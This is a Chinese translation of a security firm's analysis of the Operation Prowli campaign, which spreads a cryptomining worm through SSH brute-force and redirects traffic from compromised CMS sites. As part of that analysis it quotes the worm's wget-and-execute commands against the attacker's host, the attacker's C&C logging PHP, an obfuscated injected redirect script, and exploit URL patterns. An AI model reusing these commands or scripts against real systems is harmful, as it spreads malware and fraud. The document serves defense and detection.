# 新的恶意活动OPERATION PROWLI已感染40000台机器

阅读量 **201369**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-15 13:59:41

 **x**

##### 译文声明

本文是翻译文章，文章来源：https://www.guardicore.com/

原文地址：<https://www.guardicore.com/2018/06/operation-prowli-traffic-manipulation-cryptocurrency-mining/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01a1417b7aa3b316ef.jpg)

Guardicore实验室团队揭露了一个流量控制和加密货币挖掘活动，已感染了诸如金融、教育和政府等行业的众多组织。这项名为 **Operation
Prowli**
的活动通过恶意软件和恶意代码在服务器和网站之间传播，并已在全球范围内的多个地区感染了超过40,000台机器。Prowli使用各种攻击技术，包括漏洞攻击、密码暴力破解和弱配置。

此运动可针对多种平台：流行网站的CMS服务器、运行HP Data
Protector的备份服务器、DSL调制解调器和物联网设备。凭借互联网趋势如数字货币和流量重定向，被感染机器被以各种方式货币化。流量货币化诈骗相当普遍，它可以将网站用户从其合法请求重定向到恶意浏览器插件、技术支持诈骗服务器、虚假服务器等。

我们揭露整个Prowli运作过程，从通过流量访问被感染网站的无用户到欺诈运营商的所有方式。在本报告中，我们主要关注攻击者的技术、方法、基础设施和目标。我们将深入研究技术细节和资金流向。在这篇文章的末尾提供了与该行动有关的IOC。

## r2r2蠕虫的发现

4月4日，GuardiCore Global Sensor Network
（GGSN）报告了一组与C＆C服务器通信的SSH攻击。这些攻击的行为方式都相同：与同一个C＆C服务器进行通信，并下载一个带有加密货币矿工的名为r2r2的攻击工具。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post2-e1528222482347.png)

_GGSN记录的一部分攻击步骤_

这里我们重点关注的是：

  * 我们通过横跨不同国家的多个网络跟踪这一活动，并与不同行业相关联
  * 攻击者使用了与Guardicore Reputation存储库不同的罕见的工具和其他例如VirusTotal的已知数据集
  * 攻击者在代码中对相同域名的二进制文件使用了硬编码，并且每个二进制文件都被设计于攻击不同的服务器和CPU架构

在过去3周的时间里，我们每天都从各种国家和组织的180多个IP中捕捉到数十起此类攻击。这些攻击为我们调查攻击者的基础设施并发现存在攻击多种服务器的大范围活动提供了有力支持。

## 范围

我们发现攻击者存储了大量受害者机器的信息集合，比如它们向Internet提供不同服务的域名和IP地址。这些服务器可能都容易受到远程预认证攻击，或者允许攻击者在内部暴力破解。目标服务列表包括了Drupal
CMS网站、WordPress网站、DSL调制解调器、开放SSH端口的服务器、易受攻击的物联网设备、暴露HP Data Protector软件的服务器等等。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post-services-distribution-1-1030x601.jpg)

_大部分受感染机器都带有一个SSH弱口令_

Operation
Prowli行动的幕后攻击者们袭击了几乎所有类型和规模的组织，这一点也与我们调查的[先前](https://www.guardicore.com/2017/05/the-bondnet-army/)攻击行动一致。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post4-map.jpg)

_Operation Prowli被感染机器地理分布_

Operation Prowli行动并不针对某一特定的目标，它已经威胁到了各种服务器。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post5.jpg)

_被感染机器行业分布_

## 货币化的资金流向

比起从事一些间谍活动，Operation Prowli的攻击者们似乎更注重从他们的努力中挣钱。我们目前掌握了这项行动的两大收入来源。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post6-monetization.jpg)

第一种是数字货币挖矿，通常情况下，挖矿占用资源较大，切涉及大量的前期投资，然后才是持续的流量和能源成本。Prowli的攻击者们不需要任何成本花费即可在使用r2r2蠕虫感染并接管别人的电脑之后利用矿池洗钱。Cryptocurrency是现代蠕虫常见的有效payload，在这种前提下，与其他大部分攻击者一样，Prowli的攻击者们更倾向于Monero币的挖掘，因为这种加密货币在隐私和匿名上的专注程度高于比特币。

第二种是流量货币化欺诈。流量获利者（如roi777）从“网站运营商（如Prowli攻击者）”购买流量，并将其重定向到指定的域名上。网站“运营商”通过向roi777发送的流量赚钱。目的域名经常都是一些诈骗网站，比如一些虚假服务器，或者恶意浏览器插件等。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post7-1-1030x535.png)

_受害者被重定向到的一个虚假网站样本_

这是一个肮脏的产业，是一场流量的买家和卖家、中间商等所有第三方共同参与的非法活动。在我们的案例中，Prowli通过将受访合法网站的访问流量重定向到虚假浏览器插件、诈骗产品等带有技术支持的域名来销售流量。
与Prowli运营商合作的流量兑换商之前曾被一位匿名研究员[调查](https://malware.dontneedcoffee.com/hosted/anonymous/kotd.html)过，后者曾将其与SEO欺诈和技术支持欺诈联系起来。后来，另一个匿名研究员黑掉了
_roi777_
网站和[并将原始数据上传到了Pastebin](https://pastebin.com/hkhRi8GB)。转储数据似乎包含来自网站“合法”部分带有用户，比特币钱包地址，电报ID等信息的原始SQL列表，其表明了谁正在使用流量重定向服务的。

## 攻击目标

Operation
Prowli的操纵者使用一个包含攻击方法的工具箱来满足他们的需求。我们观测到了不同类型的攻击，每种攻击类型都基于不同的服务，一些攻击是针对互联网上的IP的随机蠕虫攻击，而另一些针对CMS服务器的攻击则使用了一个目标列表。

我们看到的部分攻击向量列表包括：

  * 1.使用暴力撞库破解攻击进行传播的自繁殖蠕虫黑掉了运行SSH的计算机，其在被感染机器上下载并运行加密货币挖矿软件。
  * 2.通过[文件下载漏洞](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7482)的攻击运行[K2](https://extensions.joomla.org/extension/k2/)扩展的Joomla!服务器，该攻击用到的URL例如： _[http://.com/index.php?option=com_k2&view=media&task=connector&cmd=file&target=[base64](http://.com/index.php?option=com_k2&view=media&task=connector&cmd=file&target=%5Bbase64) of file path]&download=1_

（这可为攻击者提供如密码和API密钥等敏感服务器配置数据。）

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post8-1.png)

_Joomla!配置细节_

  * 3.各种DSL调制解调器都因为它们使用诸如<http://:7547/UD/act?1> 之类的URL来访问面向互联网的配置面板并可传递[一种已知漏洞](https://blog.rapid7.com/2016/11/29/on-the-recent-dsl-modem-vulnerabilities/)的利用参数而被入侵。该漏洞存在于SOAP的数据处理过程中，并允许远程执行代码，[Mirai](https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759)以前也曾利用过这个漏洞。
  * 4.WordPress服务器也受到各种感染者的攻击，比如一些WP管理面板登录页面的暴力破解，和一些WordPress安装过程中的旧漏洞利用，还有一种类型的攻击会搜索具有配置问题的服务器，例如访问 _<http://.com/wp-config.php~>_ 时暴露FTP凭证的服务器。
  * 5.通过4年前的漏洞——[CVE-2014-2623](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2623)在运行暴露于Internet（通过端口5555）的HP Data Protector的服务器上执行具有系统权限的命令。

攻击者们当然也对Drupal系统、PhpMyAdmin安装、NFS盒子和暴露出SMB开放端口的服务器进行了暴力破解。

还有一种被感染机器是带有名为“[WSO Web Shell](https://scottlinux.com/2013/04/06/wso-web-shell-php-shell-used-by-hackers/)”的开源webshell的服务器。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post9.png)

_完全控制受感染的机器_

这些在不同的受感染机器上提供访问和远程代码执行的基于php的shell，通常都运行了一个易受攻击的WordPress版本。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post10.png)

_攻击者可轻易利用被感染机器来进行深层次攻击_

## 暴力破解

让我们进一步研究一下Operation Prowli的暴力破解SSH攻击。 名为 _r2r2_ 的二进制 _文件_
是用[Golang](https://golang.org/)编写的。对其的快速检查表明， _r2r2_
随机生成IP地址块，并反复尝试用用户/密码的字典强制SSH登录。

一旦成功，它会在被感染服务器上运行一系列命令，以运行wget命令从硬编码服务器下载文件：

  * 多种不同CPU架构的蠕虫副本
  * 一个加密货币挖矿程序和配置文件

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post11.png)

_蠕虫在受感染的远程服务器上执行命令并将凭证信息发送到C &C服务器_

使用的命令是：

    
    
    cd /tmp;wget -O r2r2 h[]://wp.startreceive.tk/tdest/z/r2r2;chmod 777 r2r2;./r2r2 > /dev/null 2>&1 &
    cd /tmp;wget -O r2r2-a h[]://wp.startreceive.tk/test/z/r2r2-a;chmod 777 r2r2-a;./r2r2-a > /dev/null 2>&1 &
    cd /tmp;wget -O r2r2-m h[]://wp.startreceive.tk/test/z/r2r2-m;chmod 777 r2r2-m;./r2r2-m > /dev/null 2>&1
    cd /tmp;wget -O xm111 h[]://wp.startreceive.tk/test/z/xm111;chmod 777 xm111;wget -O config.json h[]://wp.startreceive.tk/test/z/config.json;chmod 777 config.json;./xm111 > /dev/null 2>&1
    

不同版本的 _r2r2_ 二进制、 _r2r2_ 、 _r2r2-a_ 和 _r2r2-m_ 分别针对于不同平台、x86、ARM和分布式MIPS。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post12-1.png)

_从二进制文件中也可发现攻击者的名字_

在破解了服务器之后，用于登录到受害者的凭证将通过明文HTTP传输到 _wp.startreceive[.]tk/test/p.php_
并记录在攻击者服务器中。某些版本的蠕虫还会发送更多关于受害者的详细信息，如CPU，内核dist版本等。

## Joomla!.tk C&C

攻击者的攻击工具将向运行在域名 _wp.startreceive[.]tk_
下的C＆C服务器发送报告。这个[Joomla！](https://www.joomla.org/)服务器变成了一个肉鸡服务器，攻击者可以重复利用该服务器来跟踪他们的恶意软件，从不断增长的受害者列表中收集信息，并为受感染的计算机提供不同的有效payload。

C＆C逻辑由一组PHP文件实现，这些PHP文件接收来自相关感染者的受害者的数据并储存细节信息。受感染的服务器使用对应的利用方法来进行编目，并提供所有必要的细节，以便攻击者在任何特定时间再次访问它们。

    
    
    if ( isset ($_GET[‘p’ ])) {
    $myfile = file_put_contents( ‘ip2_log.txt’ , $ip. “||” .$_GET[ ‘p’ ].PHP_EOL , FILE_APPEND | LOCK_EX);
    }
    elseif ( isset ($_GET[‘p1’])){
    $myfile = file_put_contents( ‘ip3_log.txt’ , $ip. “||” .$_GET[ ‘p1’ ].PHP_EOL , FILE_APPEND | LOCK_EX);
    }
    else {
    if ( isset ($_GET[ ‘p2’ ])){
    $myfile = file_put_contents( ‘ip4_log.txt’ , $ip. “||” .$_GET[ ‘p2’ ].PHP_EOL , FILE_APPEND | LOCK_EX);
    }
    }
    if ( isset ($_GET[ ‘t1’ ])) {
    $myfile = file_put_contents( ‘mhcl_log.txt’ , $ip.PHP_EOL , FILE_APPEND | LOCK_EX);
    }
    if ( isset ($_GET[ ‘t2’ ])) {
    $myfile = file_put_contents( ‘dru_log.txt’ , $_GET[ ‘t2’ ].PHP_EOL , FILE_APPEND | LOCK_EX);
    }
    

_来自攻击者C＆C代码的片段_

对于每项目标服务器，受害者的数据都存储在日志文件中，以便攻击者在需要重新获得对该机器的访问权限时利用。例如：

  * WordPress管理面板——登录凭证
  * SSH——登录凭证
  * Joomla!——暴露的Joomla!配置文件
  * WordPress数据库——用户、密码、数据库名称和MySQL的 IP/域名
  * WordPress弱配置——显示FTP凭据的URL
  * [DSL调制解调器](https://blog.rapid7.com/2016/11/29/on-the-recent-dsl-modem-vulnerabilities/)——暴露易受攻击的配置面板的URL
  * Webshell——托管“ [WSO Web Shell](https://scottlinux.com/2013/04/06/wso-web-shell-php-shell-used-by-hackers/) ”和凭证的URL

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post13-1-1030x127.png)

_有关WordPress MySQL数据库细节的日志文件片段_

## Payload

Operation
Prowli的幕后攻击者们为他们的每一个目标使用不同的payload。SSH暴力破解攻击为攻击者们提供了系统的完全控制权和进行加密货币的挖掘活动，而被破解的网站则被用于运行各种不同的网络欺诈行为。其他被感染机器则被用来执行其他攻击，类似于将
_wp.startreceive[.]tk_ 背后用作C＆C的服务器。

Operation
Prowli的重要部分是感染运行易受攻击的CMS软件的网站。通常payload都是一个PHP文件，它会感染网站并将代码注入到不同的PHP页面和JavaScript文件中。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post14-1.png)

_部分PHP文件在易受攻击的服务器上执行_

PHP注入函数 _php_in_
检查目标PHP文件是否输出HTML，如果是，则将一个JavaScript代码片段插入到生成的页面中。这段代码会运行一个进程，以将其他的网站访问者重定向到另外的恶意网站。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post19-901x1030.png)

_Prowli攻击者介于感染网站和roi777之间_

注入的代码从 _stats.startreceive[.]tk/script.js_ 加载另一个JavaScript片段，然后从混淆的服务器端PHP文件
_stats.startreceive[.]tk/send.php_ 请求URL ，并将访问者重定向到得到的这个URL。我们相信 _send.php_
页面隶属于 _roi777_ ，并且正在被Prowli用作 _roi777_ 基础设施和“网站运营商” 之间的集成点。为了确保 _roi777_
不追踪被Prowli操纵者员控制的网站列表，Prowli代码注入脚本使用了一个重定向到 _send.php_ 页面所托管的网站（
_stats.startreceive[.]tk_ ），而不是将代码注入受感染的网站。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post16-1-1030x502.png)

_重定向器脚本去混淆之前和之后_

_send.php_ 页面检索到的受害者随后从域名 _roi777[.]COM_
重定向到目标域名。该网站提供随机选择域名，所有重定向都会到不同类型的不同网站。攻击者在目标域中添加一个唯一的ID号码，允许 _roi777_
跟踪谁在重定向流量。

![](https://www.guardicore.com/wp-content/uploads/2018/06/prowli-post17-1-1030x511.png)

_一个重定向到的技术支持诈骗样本_

综上所述，Prowli会接管合法网站，并在不知情的情况下将它们转化为恶意网站的流量重定向程序，这些恶意网址中有一些是简单的诈骗，而另一些则是参考了技术支持诈骗。

## 检测与防护

这些攻击利用了一个已知漏洞和凭证撞库的组合。这就意味着预防手段应包括使用强密码和对软件进行更新，
虽然“修补你的服务器并使用强密码”可能听起来微不足道，但我们知道这在“现实生活中”要复杂得多，当然也有其他选择比如锁定系统和分割脆弱或难以保护的系统，将它们与网络的其他部分分开。

对于CMS软件，如果例行修补或外部托管并不能有效解决问题，那么假设在某些时候它将被黑客入侵并遵循严格的强化指南。主要CMS供应商[WordPress](https://codex.wordpress.org/Hardening_WordPress)和[Drupal
](https://www.drupal.org/project/hardened_drupal)都提供了强化指南。例如，一个锁定的WordPress安装过程可以防止攻击者用代码注入来修改文件。对于通用PHP网站，OWASP提供了一个[强化的PHP配置](https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet)。

由于您始终不能避免违规，细分（Segmentation）也是一种很好的做法，您可以细分并监控您的网络，以尽量减少伤害并避免臭名昭着的违规行为，如[fish
tank违规](https://thehackernews.com/2018/04/iot-hacking-thermometer.html)。定期检查谁可以访问服务器，并将此列表保持在最低限度，尤其需要注意其凭据无法更改的物联网设备，监控连接很容易发现与加密货币矿池进行通信的受损设备。

###  R2R2感染设备

如果你的设备被r2r2感染，关掉蠕虫和挖矿程序并清除相关文件即可有效阻止攻击。不要忘了在清理过后更改密码。你可以通过监视CPU的利用率或者来自未知IP的大量不寻常SSH连接请求来监控你的设备。

###  检测Prowli被感染网站的访问者

通过检查网络流量并搜索是否有到wp.startreceive[.]tk和stats.startreceive[.]tk的流量，即可判定网络中是否有任何计算机访问过受感染的网站，试图解析这两个域名的机器此前肯定访问过受感染的网站。我们建议您确保用户没有安装任何恶意软件或被普通浏览器漏洞攻击。此外，搜索以.tk结尾的域名或许也有效。虽然该gTLD下有合法的网站，但这篇[研究](http://docs.apwg.org/reports/APWG_Global_Phishing_Report_2015-2016.pdf)中可知，钓鱼网站在该注册器下非常常见。

###  检测受感染的CMS服务器

要检查网站是否被入侵，请在代码文件（PHP和JS文件）中搜索以下代码片段：

JavaScript文件：

    
    
    eval(String.fromCharCode(118, 97, 114, 32, 122, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41, 59, 32, 122, 46, 116, 121, 112, 101, 32, 61, 32, 34, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 34, 59, 32, 122, 46, 115, 114, 99, 32, 61, 32, 34, 104, 116, 116, 112, 115, 58, 47, 47, 115, 116, 97, 116, 115, 46, 115, 116, 97, 114, 116, 114, 101, 99, 101, 105, 118, 101, 46, 116, 107, 47, 115, 99, 114, 105, 112, 116, 46, 106, 115, 63, 100, 114, 61, 49, 34, 59, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 122, 41, 59));
    

PHP文件：

    
    
    <script language=javascript>eval(String.fromCharCode(118, 97, 114, 32, 122, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41, 59, 32, 122, 46, 116, 121, 112, 101, 32, 61, 32, 34, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 34, 59, 32, 122, 46, 115, 114, 99, 32, 61, 32, 34, 104, 116, 116, 112, 115, 58, 47, 47, 115, 116, 97, 116, 115, 46, 115, 116, 97, 114, 116, 114, 101, 99, 101, 105, 118, 101, 46, 116, 107, 47, 115, 99, 114, 105, 112, 116, 46, 106, 115, 63, 100, 114, 61, 49, 34, 59, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 122, 41, 59));</script>
    

如果您发现了这些代码片断或着相类似的代码片段，可应该断定该网站已被入侵，并清理该网站。

## 结论

GuardiCore实验室调查揭示了Prowli攻击者们如何利用加密货币挖矿程序和流量劫持为其恶意活动赚钱。他们使用自动化蠕虫破解易损的机器，进行门罗币挖矿，并感染了易损的网站，将访问者重定向到恶意的域名。我们还将此活动联系到已经运行了一段时间的
_roi777_ 流量“货币化”组织。

Prowli利用不安全的网站和服务器控制了数以万计的机器。简单而有效的攻击可以在如今的互联网抓到远处的你，因为不仅仅是不安全的物联网设备，互联网中存在大量的未维护、未打补丁并保留默认凭证的系统。

虽然加密货币挖掘和流量操纵是我们所见过的被感染的机器的主要用途，但攻击者可以保持所有选项的开放。通过后门收集受害者数据，攻击者可以轻松地将受害者的机器用于其他目的，或将数据出售给其他罪犯。

## IOC

###  文件

filename | hash  
---|---  
r2r2 | 128582a05985d80af0c0370df565aec52627ab70dad3672702ffe9bd872f65d8  
r2r2-a | 09fa626ac488bca48d94c9774d6ae37d9d1d52256c807b6341f0a08bdd722abf  
r2r2-m | 908a91a707a3a47f9d4514ecdb9e43de861ffa79c40202f0f72b4866fb6c23a6  
r345 | 51f9b87efd00d3c12e4d73524e9626bfeed0f4948781a6f38a7301b102b8dbbd  
r345-a | cfb8f536c7019d4d04fb90b7dce8d7eefaa6a862a85c523d869912a1fbaf946a  
r345-m | 88d03f514b2c36e06fd3b7ed6e53c7525a8e8370c4df036b3b96a6da82c8b45b  
xm111 | b070d06a3615f3db67ad3beab43d6d21f3c88026aa2b4726a93df47145cd30ec  
cl1 | 7e6cadbfad7147d78fae0716cadb9dcb1de7c4a392d8d72551c5301abe11f2b2  
z.exe | a0a52dc6cf98ad9c9cb244d810a22aa9f36710f21286b5b9a9162c850212b160  
pro-wget | a09248f3a4d7e58368a1847f235f0ceb52508f29067ad27a36a590dc13df4b42  
pro-s2 | 3e5b3a11276e39821e166b5dbf6414003c1e2ecae3bdca61ab673f23db74734b  
  
###  域名

  * startreceive[.]tk
  *     * stats.startreceive[.]tk (traffic redirection)
  *     * wp.startreceive[.]tk (C&C)
  * roi777.com
  * minexmr.com

###  电子邮件

  * richard.melony[]openmailbox[]org

###  IP

  * 185.212.128.154

本文翻译自https://www.guardicore.com/
[原文链接](https://www.guardicore.com/2018/06/operation-prowli-traffic-manipulation-cryptocurrency-mining/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ZGBS** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/147452](/post/id/147452)

安全客 - 有思想的安全新媒体

本文转载自:
[https://www.guardicore.com/](https://www.guardicore.com/2018/06/operation-prowli-traffic-manipulation-cryptocurrency-mining/)

如若转载,请注明出处： <https://www.guardicore.com/2018/06/operation-prowli-traffic-manipulation-cryptocurrency-mining/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [技术分析](/tag/技术分析)
  * [恶意程序](/tag/恶意程序)
  * [安全研究](/tag/安全研究)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhimg.com/t014789d5aba0938a03.png) ZGBS

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

